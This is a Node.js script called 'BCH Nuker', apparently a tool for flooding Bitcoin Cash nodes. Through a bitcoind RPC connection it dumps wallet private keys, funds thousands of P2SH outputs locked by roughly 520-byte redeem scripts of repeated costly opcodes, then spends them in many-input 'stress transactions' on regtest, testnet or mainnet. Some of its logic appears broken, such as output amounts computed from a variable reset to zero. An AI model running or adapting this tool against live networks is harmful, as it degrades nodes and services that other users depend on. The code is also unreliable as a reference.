const bitcoincashjs = require('bitcoincashjs');
const bitcoind = require('bitcoind-rpc');
const Address = bitcoincashjs.Address;
const Network = bitcoincashjs.Networks;
const Script = bitcoincashjs.Script;
const readline = require('readline');
const winston = require('winston');

bitcoincashjs.Transaction.FEE_PER_KB = 50000;

// Bitcoind configuration
// Mainnet port: 8332
// Testnet/Regtest port: 18332
const config = {
  protocol: 'http',
  user: 'user',
  pass: 'passasdasdsa123',
  host: '127.0.0.1', // 127.0.0.1
  port: '18332', // 18332
};

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'nuke.log' }),
    new winston.transports.Console({ format: winston.format.simple() })
  ]
});

const redeemLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'redeem.log', level: 'info' }),
  ]
});

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const rpc = new bitcoind(config);

function generateBlocks(num, callback) {
  logger.info('Generating ' + num + ' block(s)... ');
  rpc.generate([num], function (err) {
    if (err) {
      logger.error(err);
      return;
    }
    if (callback) callback();

  });
}

function gatherUnspent(minConf, callback) {
  logger.info('Gathering UTXOs... ');
  rpc.listUnspent([minConf], function (err, ret) {
    if (err) {
      logger.error(err);
      return;
    }
    let tempUtxoArray = [];

    for (let i = 0; i < ret.result.length; i++) {
      if (ret.result[i].amount > 0.00000546) {
        let utxo = new bitcoincashjs.Transaction.UnspentOutput({
          "txid" : ret.result[i].txid,
          "vout" : ret.result[i].vout,
          "address" : Address.fromString(ret.result[i].address, networkParam, 'pubkeyhash', Address.CashAddrFormat),
          "scriptPubKey" : ret.result[i].scriptPubKey,
          "amount" : ret.result[i].amount
        });
        tempUtxoArray.push(utxo);
      }
    }
    logger.info('Adding ' + tempUtxoArray.length + ' UTXOs...');
    utxoArray = tempUtxoArray;
    if (callback) callback();

  });
}

function getPrivateKeys(addresses, callback) {
  let privateKeyArray = [];

  function sendRequest(address, callback) {
    rpc.dumpPrivKey([address], function (err, ret) {
      if (err) {
        logger.error(err);
        return;
      }
      privateKeyArray.push(ret.result);
      if (callback) return callback(privateKeyArray);

    });
  }

  const execute = async (address, callback, res) => {
    await sendRequest(address, callback, res);
  };

  for (let i = 0; i < addresses.length; i++) {
    execute(addresses[i], callback);
  }
}

async function createRawTransaction(txParams, unsignedP2shTx) {
  function sendRequest() {
return new Promise(res => {
    rpc.createRawTransaction(txParams.inputs, txParams.address, async function (err, ret) {
      if (err) {
        logger.error('createRawTransaction():', err);
        return;
      }
      unsignedP2shTx.txhex = ret.result;
      await signRawTransactions(unsignedP2shTx, res);
    });
});
  }
  const execute = async () => {
    await sendRequest();
  };
  await execute();
}

function getBlockchainInfo(callback) {
  function sendRequest(callback) {
    rpc.getBlockchainInfo(function (err, ret) {
      if (err) {
        logger.error(err);
        return;
      }
      network = ret.result.chain;
      if (network === 'regtest') networkParam = 'testnet';
      else if (network === 'test') networkParam = 'testnet';
      else networkParam = 'livenet';

      if (network === 'regtest') Network.enableRegtest();
      if (callback) return callback(ret.result.chain);
      return ret.result.chain;
    });
  }
  const execute = async (callback) => {
    await sendRequest(callback);
  };
  execute(callback);
}

async function signRawTransactions(unsignedTx, callback) {
  function sendRequest() {
    let amount = unsignedTx.amount;
    rpc.signRawTransaction(unsignedTx.txhex,
        [{"txid": unsignedTx.txid, "vout": unsignedTx.vout, "scriptPubKey": unsignedTx.scriptPubKey,
          "redeemScript": unsignedTx.redeemScript, "amount": amount}], [unsignedTx.privateKey],
            async function (err, ret) {
      if (err) {
        logger.error('signRawTransactions():', err);
        return;
      }
      await callback(sendRawTransaction(ret.result.hex));
    });
  }
  const execute = async () => {
    await sendRequest();
  };

  await execute();
}

async function sendRawTransaction(tx, callback) {
  function sendRequest(obj) {
    rpc.sendRawTransaction(obj, true, function (err, ret) {
      if (err) {
        logger.error(err);
        return;
      }
      logger.info('Stress tx sent: ' + ret.result);
      if (typeof callback !== 'undefined') {
        return callback(ret.result);
      }
      return ret.result;
    });
  }

  const execute = async (obj) => {
    await sendRequest(obj);
  };
  if (typeof tx !== 'undefined') {
    await execute(tx);
  }
  else {
    for (let i = 0; i < txArray.length; i++) {
      await execute(txArray[i].tx.toString());
      sentTxArray.push(txArray[i]);
    }
  }
}

async function sendQueuedTransactions(callback) {
  function sendRequest(obj) {
    logger.info('Sending tx: ' + obj.tx.toObject().hash);
    rpc.sendRawTransaction([obj.tx.toString()], function (err, ret) {
      if (err) {
        logger.error(err);
        return;
      }
      if (callback) return callback(ret.result);
      return ret.result;
    });
  }
  const execute = async (obj) => {
    await sendRequest(obj);
  };
  for (let i = 0; i < txArray.length; i++) {
    await execute(txArray[i]);
    sentTxArray.push(txArray[i]);
  }
}

async function broadcastTransactions(callback) {
  // Broadcast transactions
  logger.info('Broadcasting ' + txArray.length + ' transactions...');
    await sendQueuedTransactions();
  if (callback) return callback();
}

function promisePrivateKey(tempUtxos) {
  let addresses = [];
  let privateKeys = [];
  return new Promise(function(resolve) {
    for (let i = 0; i < tempUtxos.length; i++) {
      addresses.push(tempUtxos[i].address.toString(Address.CashAddrFormat));
    }
    privateKeys = getPrivateKeys(addresses, resolve);
  })
  .then(function(privateKeys) {
    let tempKeyPair = keyPairArray[0];

    // Create 520 byte redeem script
    let redeemScript = Script();
    for (let i = 0; i < 86; i++) {
      redeemScript.add(new Buffer('fe7f', 'hex'));
      redeemScript.add('OP_4');
      redeemScript.add(0x80);
      redeemScript.add('OP_DROP')
    }
    redeemScript.add('OP_NOP');
    redeemScript.add('OP_1');
    redeemScript.add('OP_DROP');
    redeemScript.add('OP_1');

    // Create script hash and output address
    let scriptHash = Script.buildScriptHashOut(redeemScript);
    let outAddress = scriptHash.toAddress(networkParam);

    // Create P2SH transactions with OP_NUM2BIN
    let amount = 0;
    for (let i = 0; i < tempUtxos.length; i++) {
      amount += tempUtxos[i].satoshis;
    }
    amount = amount * 0.96; // pre-allocate 4% for fees
    let transaction = new bitcoincashjs.Transaction()
      .from(tempUtxos)
      .change(tempUtxos[0].address);
    for (let i = 0; i < 1000; i++) { // 1000 outputs
      transaction.to(outAddress, Math.floor(amount/1000));
    }
    transaction.fee(transaction.getFee());
    transaction.sign(privateKeys);
    txArray.push({tx: transaction, redeemScript: redeemScript, keyPair: tempKeyPair});
    redeemLogger.info({tx: transaction, redeemScript: redeemScript, keyPair: tempKeyPair});
  });
}

function generateTransactions(callback) {
  // Generating transactions
  logger.info('Generating transactions...');
  const makeTransaction = async () => {
    let tempUtxoArray = [];
    for (let i = 0; i < p2shUtxos / 1000; i++) {
      let tempSatoshis = 0;
      tempUtxoArray[i] = [];
      do {
        if (utxoArray.length === 0) {
          logger.warn('Warning: not enough UTXOs to generate transactions');
          process.exit(1);
        }
        let tempUtxo = utxoArray.pop();
        tempUtxoArray[i].push(tempUtxo);
        tempSatoshis += tempUtxo.satoshis;
      } while (tempSatoshis < 100000); // 0.001 btc
    }
    for (let i = 0; i < tempUtxoArray.length; i++) {
      await promisePrivateKey(tempUtxoArray[i]);
    }
  };
  makeTransaction().then(() => {
    if (callback) return callback();

  });
}

async function promiseTxSender(callback) {
  for (let i = 0; i < promises.length; i++) {
    await createRawTransaction(promises[i].rawTxParams, promises[i].unsignedP2shTx);
  }
  callback();
}


console.log(`
██████╗  ██████╗██╗  ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗
██╔══██╗██╔════╝██║  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██████╔╝██║     ███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██╔══██╗██║     ██╔══██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝╚██████╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
`);

console.log(`                      █████████
  ███████          ███▒▒▒▒▒▒▒▒███
  █▒▒▒▒▒▒█       ███▒▒▒▒▒▒▒▒▒▒▒▒▒███
   █▒▒▒▒▒▒█    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
    █▒▒▒▒▒█   ██▒▒▒▒▒██▒▒▒▒▒▒██▒▒▒▒▒███
     █▒▒▒█   █▒▒▒▒▒▒████▒▒▒▒████▒▒▒▒▒▒██
   █████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
   █▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒██
 ██▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒██▒▒▒▒▒▒▒▒▒▒██▒▒▒▒██
██▒▒▒███████████▒▒▒▒▒██▒▒▒▒▒▒▒▒██▒▒▒▒▒██
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒████████▒▒▒▒▒▒▒██
██▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
 █▒▒▒███████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
 ██▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
  ████████████   █████████████████`);
console.log('Press ctrl-c at any time to exit my bro\n');

// Initialize
let p2shTxs;
let p2shUtxos;
let keyPairArray = [];
let network;
let networkParam;
let promises = [];
let sentTxArray = [];
let txArray = [];
let utxoArray = [];

function asyncRun() {
  new Promise(mainResolve => {
    new Promise(res => {
      getBlockchainInfo(res);
    })
    .then(function() {
      if (network === 'regtest') {
        return new Promise(res => {
          const recursiveReadLine = function () {
            rl.question('Regtest detected: How many blocks are we generating? (default 500): ', function(input) {
              if (!(parseInt(input))) {
                logger.error('Failed to parse input');
                return recursiveReadLine();
              }
              escape = true;
              let blocks = parseInt(input);
              generateBlocks(blocks, res);
            });
          };
          recursiveReadLine();
        })
      }
    })
    .then(function() {
      return new Promise(res => {
        gatherUnspent(1, res);
      });
    })
    .then(function() {
      return new Promise(res => {
        const recursiveReadLine = function () {
          rl.question('How many P2SH UTXOs are we generating mate (input x 1000)? : ', function(input) {
            if (!(parseInt(input))) {
              logger.error('Failed to parse input');
              return recursiveReadLine();
            }
            p2shUtxos = parseInt(input) * 1000;
            res();
          });
        };
        recursiveReadLine();
      })
    })
    .then(function() {
      // Generate new keypairs
      logger.info('Generating keypairs for P2SH addresses...');
      for (let i = 0; i < p2shUtxos; i++) {
        let privateP2shKey = new bitcoincashjs.PrivateKey(networkParam);
        let publicP2shKey = privateP2shKey.toPublicKey(networkParam);
        keyPairArray.push({privateKey: privateP2shKey, publicKey: publicP2shKey});
      }

    })
    .then(function() {
      return new Promise(res => {
        generateTransactions(res);
      })
    })
    .then(function() {
      return new Promise(res => {
        rl.question('Press enter to broadcast transactions: ', function() {
          broadcastTransactions(res);
        });
      });
    })
    .then(function() {
      return new Promise(res => {
        // Generate block or wait
        if (network === 'regtest') {
          generateBlocks(p2shUtxos/1000, res);
        }
        else {
          rl.question('Wait for transactions to confirm before continuing. Press enter to continue: ', function() {
            res();
          });
        }
      })
    })
    .then(function() {
      return new Promise(res => {
        const recursiveReadLine = function () {
          rl.question('How many P2SH inputs should we include per transaction (default 25)?: ', function(input) {
            if (!(parseInt(input)) || parseInt(input) > p2shUtxos) {
              logger.error('Failed to parse input (are you sure we have enough P2SH UTXOs generated?)');
              return recursiveReadLine();
            }
            p2shTxs = parseInt(input);
            res();
          });
        };
        recursiveReadLine();
      })
    })
    .then(function() {
      return new Promise(res => {
        res(mainResolve);
      })
    })
    .then(function() {
      return new Promise(res => {
        let inputLength = p2shTxs;
        let inputTicker = 0;
        let sentArray = [];
        let ticker = 0;
        let unsignedP2shTxArray = [];

        // Grab relayed P2SH output and redeem script
        for (let i = 0; i < sentTxArray.length; i++) {
          let sentTx = sentTxArray[i].tx;
          let sentRedeemScript = sentTxArray[i].redeemScript;
          let sentKeyPair = sentTxArray[i].keyPair;
          sentArray.push({sentTx: sentTx, sentRedeemScript: sentRedeemScript, sentKeyPair: sentKeyPair});
        }

        // Build UTXO set to redeem P2SH transaction
        let txAmount = 0;
        for (let i = 0; i < sentArray.length; i++) {
          let sentKeyPairObject = sentArray[i].sentKeyPair;
          let sentRedeemScriptObject = sentArray[i].sentRedeemScript;
          let sentTxObject = sentArray[i].sentTx.toObject();
          let outputLength = sentArray[i].sentTx.toObject().outputs.length;
          for (let n = 0; n < outputLength; n++) {
            let unsignedP2shUtxo = {
              "txid": sentTxObject.hash,
              "vout": sentTxObject.inputs[0].outputIndex,
              "scriptPubKey": sentTxObject.outputs[n].script,
              "redeemScript": sentRedeemScriptObject.toHex(),
              "amount": sentTxObject.outputs[n].satoshis / 100000000,
              "privateKey": sentKeyPairObject.privateKey.toWIF(networkParam),
            };
          txAmount += unsignedP2shUtxo.amount;
          unsignedP2shTxArray.push(unsignedP2shUtxo);
          }
        }

        // Loop for generating and broadcasting stress transactions
        logger.info('Generating ' + Math.ceil(p2shUtxos/p2shTxs) + ' stress transactions...');
        for (let x = 0; x < Math.ceil(p2shUtxos/p2shTxs); x++) {
          let txAmount = 0;
          let address = utxoArray[0].address; // same address
          let feeMultiplier;
          if (txAmount > 100) feeMultiplier = 0.98; // 2%
          else if (txAmount > 1) feeMultiplier = 0.96; // 4%
          else feeMultiplier = 0.94; // 6%

          // Params for createRawTransaction()
          if (x === Math.ceil(p2shUtxos/(p2shTxs)) - 1) inputLength = (p2shUtxos - (x * p2shTxs));
          let rawTxParams = {};
          rawTxParams["inputs"] = [];

          for (let i = 0; i < inputLength; i++) {
            let addInput = {
              "txid": unsignedP2shTxArray[ticker].txid,
              "vout": inputTicker
            };
            rawTxParams["inputs"].push(addInput);
            inputTicker++;
            if (inputTicker > 1000) {
              inputTicker = 0;
              ticker++;
            }
          }
          rawTxParams["address"] = {};
          rawTxParams["address"][address] = (txAmount * feeMultiplier).toFixed(8);
          promises.push({'rawTxParams': rawTxParams, 'unsignedP2shTx': unsignedP2shTxArray[0]});
        }
        res();
      });
    })
    .then(function() {
      return new Promise(res => {
        promiseTxSender(res);
      });
    })
    .then(function() {
      logger.info('Mission complete.');
      process.exit(0);
    });
  });
}
asyncRun();
